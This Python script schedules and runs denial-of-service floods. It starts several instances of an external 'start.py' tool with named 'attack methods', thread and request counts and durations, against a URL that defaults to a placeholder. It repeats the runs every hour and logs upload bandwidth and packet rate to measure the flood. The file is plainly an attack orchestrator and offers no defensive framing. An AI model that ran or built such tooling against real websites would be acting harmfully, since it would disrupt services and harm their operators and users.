import argparse
import schedule
import time
import os
import datetime
import logging
import psutil
import threading
import subprocess  # Import subprocess module



# Set up logging
DEBUG = 1
if DEBUG:
    logging.basicConfig(level=logging.DEBUG)
else:
    logging.basicConfig(level=logging.INFO)

cpu_exceed_count = 0

def print_stats(processes=None, execution_seconds=None):
    start_time = datetime.datetime.now()
    old_value = psutil.net_io_counters()
    old_packets = old_value.packets_sent
    
    while True:
        time.sleep(0.5)
        
        elapsed_time = datetime.datetime.now() - start_time
        current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        new_value = psutil.net_io_counters()
        sent_bytes = new_value.bytes_sent - old_value.bytes_sent
        sent_mbps = sent_bytes / 1024 / 1024 * 2
        
        new_packets = new_value.packets_sent
        packets_per_second = (new_packets - old_packets) / 0.5  # because we sleep for 0.5 seconds
        old_value = new_value
        old_packets = new_packets

        
        if execution_seconds and elapsed_time.total_seconds() >= execution_seconds:
            logging.info("Monitoring time ended.")
            return
        
        if DEBUG:
            memory_info = psutil.virtual_memory()
            memory_percent = memory_info.percent
            cpu_percent = psutil.cpu_percent(interval=None)
            log_msg = (
                f"[{current_time}] "
                f"CPU Usage: {cpu_percent}% | "
                f"Memory Usage: {memory_percent}% | "
                f"Upload: {sent_mbps:.2f} MBps | "
                f"Packets Sent/Sec: {packets_per_second}"
            )
            logging.debug(log_msg)


def job_every_hour(url, methods, threads, requests, seconds, instances, http):

    
    logging.info(f"Running job at {datetime.datetime.now()}")
    global processes

    processes = []
    stats_thread = threading.Thread(target=print_stats, args=(processes,))
    stats_thread.daemon = True
    stats_thread.start()

    methods_list = methods.split(',')
    if len(methods_list) != instances:
        logging.error("The number of methods must match the number of instances.")
        return

    processes = []
    for i in range(instances):
        command = [
            'python3', 'start.py',
            methods_list[i],  # HTTP method
            url,  # URL
            '1',  # Static value as per original structure
            str(threads),  # Number of threads
            http,  # HTTP file path
            str(requests),  # Number of requests
            str(seconds)  # Duration in seconds
        ]
        process = subprocess.Popen(command)
        processes.append(process)

    for p in processes:
        p.wait()

def run_scheduled_jobs():


    url = "https://notreal.notreal"  # Default URL for all scheduled jobs
    http = "http.txt"  # Default HTTP file for all scheduled jobs
    jobs_to_run = [
        # Assuming the format is (methods, threads, requests, seconds, instances)
        ("EVEN,GET", 70, 1, 60, 2),
        ("EVEN,GET", 50, 100, 580, 2),
        ("HEAD,HEAD", 50, 100, 600, 2),
    ]

    for methods, threads, requests, seconds, instances in jobs_to_run:
        # Schedule each job to run once immediately for demonstration
        # Adjust the scheduling as needed
        schedule.every().day.at("00:00").do(job_every_hour, url, methods, threads, requests, seconds, instances, http)

def run_now(url, methods, threads, requests, seconds, instances, http):
    job_every_hour(url, methods, threads, requests, seconds, instances, http)

# Argument parsing
parser = argparse.ArgumentParser()
parser.add_argument("time", nargs='?', default="schedule", help="Enter 'now' to run the job immediately or 'schedule' to setup scheduled jobs.")
parser.add_argument("--threads", type=int, default=2, help="Number of threads to use.")
parser.add_argument("--requests", type=int, default=100, help="Number of requests to send.")
parser.add_argument("--seconds", type=int, default=300, help="Duration in seconds.")
parser.add_argument("--url", default="https://notreal.notreal", help="URL to send requests to.")
parser.add_argument("--instances", type=int, default=2, help="Number of instances to run.")
parser.add_argument("--http", default="http.txt", help="name of the http.txt file.")
parser.add_argument("--methods", default="GET,GET", help="Comma-separated list of attack methods to use, matching the number of instances.")
args = parser.parse_args()

if args.time.lower() == 'now':
    run_now(args.url, args.methods, args.threads, args.requests, args.seconds, args.instances, args.http)
else:
    # Adjust the scheduled jobs setup if needed
    for i in range(0, 24):
        schedule.every().day.at(f"{str(i).zfill(2)}:00:00").do(
            run_now, args.url, args.methods, args.threads, args.requests, args.seconds, args.instances, args.http
        )

while True:
    schedule.run_pending()
    time.sleep(1)
